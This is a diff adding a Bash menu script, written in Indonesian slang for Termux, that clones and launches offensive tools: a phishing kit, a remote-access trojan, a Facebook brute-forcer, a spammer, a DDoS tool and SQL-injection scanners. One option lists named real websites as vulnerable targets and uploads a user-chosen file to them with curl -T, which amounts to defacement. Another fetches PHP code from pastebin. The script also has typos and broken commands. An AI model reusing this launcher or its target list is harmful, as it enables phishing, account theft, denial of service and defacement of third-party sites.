@@ -1,0 +1,521 @@
+#!/bin/bash
+#Mr.s0s.X..!?/.>#
+#kalo lu mau recode bayar sama gua
+#gua cape goblog bikinnya
+#reedit gak bakalan jadiin lu mastah
+#Mikir pake otak goblog
+
+#variables
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+endc='\E[0m'
+enda='\033[0m'
+blue='\e[1;34m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+spath="$( cd "$( dirname $0 )" && pwd )"
+echo ""
+echo -e  $red "L"
+sleep 0.3
+clear
+echo -e $white"LO"
+sleep 0.3
+clear
+echo -e $green"LOA"
+sleep 0.3
+clear
+echo -e $cyan"LOAD"
+sleep 0.3
+clear 
+echo -e $yellow"LOADI"
+sleep 0.3
+clear
+echo -e $blue"LOADIN"
+sleep 0.3
+clear
+echo -e $purple"LOADING"
+sleep 0.3
+clear
+echo -e $red "L"
+sleep 0.3
+clear
+echo -e $white"LO"
+sleep 0.3
+clear
+echo -e $green"LOA"
+sleep 0.3
+clear
+echo -e $cyan"LOAD"
+sleep 0.3
+clear
+echo -e $yellow"LOADI"
+sleep 0.3
+clear
+echo -e $blue"LOADIN"
+sleep 0.3
+clear
+echo -e $purple"LOADING"
+sleep 0.3
+clear
+echo -e $cyan "Sabar GoBlog$green Gua Tamvan Kan"
+sleep 4
+clear
+echo -e $red "L"
+sleep 0.3
+clear
+echo -e $white"LO"
+sleep 0.3
+clear
+echo -e $green"LOA"
+sleep 0.3
+clear
+echo -e $cyan"LOAD"
+sleep 0.3
+clear
+echo -e $yellow"LOADI"
+sleep 0.3
+clear
+echo -e $blue"LOADIN"
+sleep 0.3
+clear
+echo -e $purple"LOADING"
+sleep 0.3
+clear
+echo -e $red "L"
+sleep 0.3
+clear
+echo -e $white"LO"
+sleep 0.3
+clear
+echo -e $green"LOA"
+sleep 0.3
+clear
+echo -e $cyan"LOAD"
+sleep 0.3
+clear
+echo -e $yellow"LOADI"
+sleep 0.3
+clear
+echo -e $blue"LOADIN"
+sleep 0.3
+clear
+echo -e $purple"LOADING"
+sleep 0.3
+clear
+echo -e $red "L"
+sleep 0.3
+clear
+echo -e $white"LO"
+sleep 0.3
+clear
+echo -e $green"LOA"
+sleep 0.3
+clear
+echo -e $cyan"LOAD"
+sleep 0.3
+clear
+echo -e $yellow"LOADI"
+sleep 0.3
+clear
+echo -e $blue"LOADIN"
+sleep 0.3
+clear
+echo -e $purple"LOADING"
+sleep 0.3
+clear
+echo -e $red "L"
+sleep 0.3
+clear
+echo -e $white"LO"
+sleep 0.3
+clear
+echo -e $green"LOA"
+sleep 0.3
+clear
+echo -e $cyan"LOAD"
+sleep 0.3
+clear
+echo -e $yellow"LOADI"
+sleep 0.3
+clear
+echo -e $blue"LOADIN"
+sleep 0.3
+clear
+echo -e $purple"LOADING"
+sleep 0.3
+clear
+echo -e $red "L"
+sleep 0.3
+clear
+echo -e $white"LO"
+sleep 0.3
+clear
+echo -e $green"LOA"
+sleep 0.3
+clear
+echo -e $cyan"LOAD"
+sleep 0.3
+clear
+echo -e $yellow"LOADI"
+sleep 0.3
+clear
+echo -e $blue"LOADIN"
+sleep 0.3
+clear
+echo -e $purple"LOADING"
+sleep 0.3
+clear
+echo -e $cyan"Mr.s0s$green Tamvan$purple Kan"
+sleep 4
+clear
+echo -e $green"Berdoa Dulu Biar Work Oke"
+sleep 3
+clear
+echo ""
+echo -e $red"           __  ___            ____"
+echo -e $endc"          /  |/  /____  _____/ __ \_____"
+echo -e $red"         / /|_/ / ___/ / ___/ / / / ___/"
+echo -e $endc"        / /  / / /  _ (__  ) /_/ (__  )"
+echo -e $red"       /_/  /_/_/  (_)____/\____/____/"
+echo ""
+echo -e $cyan"========$blue========$red=========$yellow========$green======$blue========"
+echo -e $endc"Author : $green /Mr.s0s"
+echo -e $red"Tools  : $green Tools Installer"
+echo -e $blue"Thanks : $green Termux Asociation And GCT"
+echo -e $endc"Email  : $green Mr.s0sTamvan@gmail.com"
+echo -e $purple"No Wa  : $green 08878819132"
+echo -e $yellow"Pacar  : $green Gua Jomblo:("
+echo -e $cyan"=======$blue====$yellow=======$red=====$purple=======$green=======$red=========="
+echo ""
+echo -e $red"            Silahkan$white Di$white Pilih$red Coeg"
+echo -e $red"      ##################################"
+echo -e $red"      ###   ##       ##   #   ##      ##"
+echo -e $red"      ###   ##   #   ##   #   ##  ######"
+echo -e $red"      ###   ##       ##       ##      ## "
+echo -e $white"      ###   ######   ######   ######  ##"
+echo -e $white"      ###   ##   #   ######   ##   #  ##"
+echo -e $white"      ###   ##       ######   ##      ##"
+echo -e $white"      ##################################"
+echo -e $cyan "Martabak$blue Spesial$red Itu$green Pasti$yellow Ada$purple Kacang$endc Nya..."
+echo -e $cyan "Jadi$blue Kalo$red Lo$green suka$yellow Di Kacangin$purple Lo Itu$white Spesial"
+echo ""
+
+###################################################
+# CTRL C
+###################################################
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -e $cyan"[#]> (Ctrl + C ) Detected, Trying To Exit ..."
+sleep 1
+echo ""
+echo "[#]> Knapah yah Gua itu jomblo padahal gua tamvan cuk, mungkin ini kutukan kali ea karena gua sering mainin cewe dulu " | lolcat
+sleep 1
+echo ""
+echo -e $red"[#]> bye-bye"
+sleep 6
+exit
+}
+
+echo ""
+echo -e $red"================================================"
+echo -e $green"[1] Lazymux"
+echo -e $red"================================================"
+echo -e $yellow"[2] Tools TU4N BADUT"
+echo -e $red"================================================"
+echo -e $cyan"[3] Tools-X "
+echo -e $red"================================================"
+echo -e $purple"[4] Tools B4DJ1N64N "
+echo -e $red"================================================"
+echo -e $blue"[5] KonToolsV1 "
+echo -e $red"================================================"
+echo -e $white"[6] KonToolsV2 "
+echo -e $red"================================================"
+echo -e $green"[7] Tools Mr.Cakil "
+echo -e $red"================================================"
+echo -e $blue"[8] Tools Gado-Gado "
+echo -e $red"================================================"
+echo -e $green"[9] sqlmap"
+echo -e $red"================================================"
+echo -e $yellow"[10] Tools Diejoubu"
+echo -e $red"================================================"
+echo -e $cyan"[11] Weeman Buat phising"
+echo -e $red"================================================"
+echo -e $purple"[12] A-rat"
+echo -e $red"================================================"
+echo -e $blue"[13] Webdav"
+echo -e $red"================================================"
+echo -e $white"[14] Nuyul Bitcoin buat Pecinta Receh"
+echo -e $red"================================================"
+echo -e $green"[15] Metasploit"
+echo -e $red"================================================"
+echo -e $yellow"[16] MBF buat Hek efbi"
+echo -e $red"================================================"
+echo -e $purple"[17] MultiSpam"
+echo -e $red"================================================"
+echo -e $cyan"[18] DEDEOS"
+echo -e $red"================================================"
+echo -e $white"[19] viSQL"
+echo -e $red"================================================"
+echo -e $green"[20] Black Hydra"
+echo -e $red"================================================"
+echo -e $yellow"[Q] Quit"
+echo -e $red"================================================"
+echo ""
+echo -e $green"Mr.s0s [pilih nomornya] "
+echo -e $red
+read -p "root@localhost~: " pil ;
+
+#Lazymux
+
+case $pil in
+1) git clone https://github.com/Gameye98/Lazymux
+echo "${y} Installer Lazymux..."
+echo "${y} cd Lazymux"
+echo "${y} python2 lazymux.py"
+cd /data/data/com.termux/files/home/Lazymux/
+python2 /data/data/com.termux/files/home/Lazymux/lazymux.py
+
+;;
+
+#ToolsInstaller
+
+2) git clone https://github.com/TUANB4DUT/ToolsInstaller
+echo "${y} Installer ToolsInstaller..."
+echo "${y} cd ToolsInstaller"
+echo "${y} sh Tuanb4dut.sh"
+cd /data/data/com.termux/files/home/ToolsInstaller/
+python2 /data/data/com.termux/files/home/ToolsInstaller/Tuanb4dut.sh
+
+;;
+
+#Toos-X
+
+3) git clone https://github.com/Rajkumrdusad/Tool-X
+echo "${y} Installer Tool-X..."
+echo "${y} cd Tool-X"
+echo "${y} sh install.aex"
+cd /data/data/com.termux/files/home/Tool-X
+bash /data/data/com.termux/files/home/Tool-X/install.aex
+
+;;
+
+#BAJINGANv6
+
+4) git clone https://github.com/DarknessCyberTeam/BAJINGANv6
+echo "${y} installer BAJINGANv6..."
+echo "${y} cd BAJINGANv6"
+echo "${y} sh BAJINGAN.sh"
+cd /data/data/com.termux/files/home/BAJINGANv6
+bash /data/data/com.termux/files/home/BAJINGANv6/BAJINGAN.sh
+
+;;
+
+#Ngentod
+
+5) git clone https://github.com/Mrs0sTamvan/Ngentod
+echo "${y} installer Ngentod..."
+echo "${y} cd Ngentod"
+echo "${y} sh Mrs0s.sh"
+cd /data/data/com.termux/files/home/Ngentod
+bash /data/data/com.termux/files/home/Ngentod/Mrs0s.sh
+
+;;
+
+#KonToolsV2
+
+6) git clone https://github.com/Mrs0sTamvan/KonToolsV2
+echo "${y} installer KonToolsV2..."
+echo "${y} cd KonToolsV2"
+echo "${y} ./KontoolsV2"
+cd /data/data/com.termux/files/home/KonToolsV2
+bash /data/data/com.termux/files/home/KonToolsV2/KontoolsV2
+
+;;
+
+#mrcakil
+
+7) git clone git clone https://github.com/Mrcakil/mrcakil
+echo "${y} installer mrcakil..."
+echo "${y} cd mrcakil"
+echo "${y} chmod 777 tools"
+echo "${y} ./tools"
+cd /data/data/com.termux/files/home/mrcakil
+bash /data/data/com.termux/files/home/mrcakil/tools
+
+;;
+
+#Gado-Gado
+
+8) git clone https://github.com/Senitopeng/GadoGado.git
+echo "${y} installer Gado-Gado..."
+echo "${y} cd GadoGado"
+echo "${y} bash gado"
+cd /data/data/com.termux/files/home/GadoGado
+bash /data/data/com.termux/files/home/GadoGado/gado
+
+;;
+
+#sqlmap
+
+9) git clone http://github.com/MrsOsTamvan/Ngentod
+echo "${y} installer Ngentod..."
+echo "${y} cd Ngentod"
+echo "${y} php sqlscanS0S.php"
+cd /data/data/com.termux/files/home/Ngentod
+php /data/data/com.termux/files/home/Ngentod/sqlscanS0S.php
+
+;;
+
+#Tools Diejoubu
+
+10) git clone https://github.com/alintamvanz/diejoubu
+echo "${y} installer diejoubu..."
+echo "${y} cd diejoubu"
+echo "${y} cd v1.2"
+echo "${y} php diejoubu.php"
+cd /data/data/com.termux/files/home/diejoubu
+php /data/data/com.termux/files/homd/diejoubu/v1.2/diejoubu.php
+
+;;
+
+#Weeman
+
+11) git clone https://github.com/evait-security/weeman.git
+echo "${y} installer weeman..."
+echo "${y} cd weeman"
+echo "${y}python2 weeman.py"
+cd /data/data/com.termux/files/home/weeman
+python2 /data/data/com.termuz/files/home/weeman/weeman.py
+
+;;
+
+#A-rat
+
+12) git clone https://github.com/Xi4u7/A-Rat.git
+echo "${y} installer A-rat..."
+echo "${y} cd A-rat"
+exho "${y} python2 A-rat.py"
+cd /data/data/com.termux/files/home/A-rat
+python2 /data/data/com.termux/files/home/A-rat/A-rat.py
+
+;;
+
+#Webdav
+
+13) echo -e $cyan""
+cowsay -f kiss.cow "Mr.sOs" | lolcat
+figlet -f slant Mr.sOs
+echo ""
+echo -e $green"Masukan Web target"
+echo -e $yellow"Contoh Web Target vuln"
+echo -e $blue"  http://bestilling.udir.no/"
+echo -e $cyan"  http://560560.ru/"
+echo -e $purple"  http://myownemailer.com/"
+echo -e $red"  http://Zoocentral.co.za/"
+echo -e $white"  http://50-50-50.ru/"
+echo -e $green"  http://tirupurjobs.net/"
+echo -e $yellow"  http://Matrimony.co.za/"
+echo -e $blue"  http://Bheh.co.za/"
+read -p "[MrsOs]>" target
+echo -e $cyan"Masukan Nama script lu kamvang"
+echo -e $cyan"yang ada di Luar Folder Ruang Penyimpanan"
+read -p "[MrsOs]>" script
+curl -T /storage/emulated/0/$script $target
+echo -e $green""
+echo "Selesai! Tod Cek di $target $script "
+
+;;
+
+#Nuyul Bitcoin
+
+14) wget -O tuyul.php https://pastebin.com/raw/3ERZV3nL
+echo "${y} installer Tuyul..."
+echo "${y} php tuyul.php"
+
+;;
+
+#Metasploit
+
+15) curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
+echo "${y} installer Metasploit.."
+echo "${y} cd metasploit-framework"
+echo "${y} ./msfconsole"
+
+;;
+
+#MBF
+
+16) git clone http://github.com/senitopeng/fbbrute
+echo "${y} installer MBF..."
+echo "${y} cd fbbrute"
+echo "${y} python2 MBF.py"
+cd /data/data/com.termux/files/home/fbbrute
+python2 /data/data/com.termux/files/home/fbbrute/MBF.py
+
+;;
+
+#MultiSpam
+
+17) git clone https://github.com/Kereh/MultiSpam
+echo "${y} installer MultiSpam..."
+echo "${y} cd MultiSpam"
+echo "${y} python2 MultiSpam.py
+cd /data/data/com.termux/files/home/MultiSpam
+python2 /data/data/com.termux/files/home/MultiSpam/MultiSpam.py
+
+;;
+
+#DEDEOS
+
+18) git clone https://github.com/zanyarjamal/xerxes
+echo "${y} installer xerxes..."
+echo "${y} cd xerxes"
+echo "${y} pkg install clang"
+echo "${y} clang xerxes.c -o xerxes
+cd /data/data/com.termux/files/home/xerxes
+clang /data/data/com.termux/files/home/xerxes/xerxes.c
+
+;;
+
+#viSQL
+
+19) git clone https://github.com/blackvkng/viSQL
+echo "${y} installer viSQL..."
+echo "${y} cd viSQL"
+echo "${y} python2 -m pip install -r requirements.txt"
+echo "${y} python2 viSQL.py"
+cd /data/data/com.termux/files/home/viSQL
+python2 /data/data/com.termux/files/home/viSQL/viSQL.py
+
+;;
+
+#Black-Hydra
+
+20) git clone https://github.com/Gameye98/Black-Hydra.git
+echo "${y} inataller Black-Hydra..."
+echo "${y} cd Black-Hydra"
+echo "${y} python2 blackhydra.py"
+cd /data/data/com.termux/files/home/Black-Hydra
+python2 /data/data/com.termux/files/home/Black-Hydra/blackhydra.py
+
+;;
+
+Q) echo -e $cyan"Creator By Mr.s0s"
+echo -e $green"Thank you stah udh pake tools gua"
+echo -e $green"Sorry kalo tools gua jelek  "
+echo -e $green"soalnya gua masih newbie   "
+echo -e $green"SAMPAI KEMBALI LAGI"
+exit
+
+;;
+
+*) echo "Gua Tamvan Kan"
+esac
+done
+done
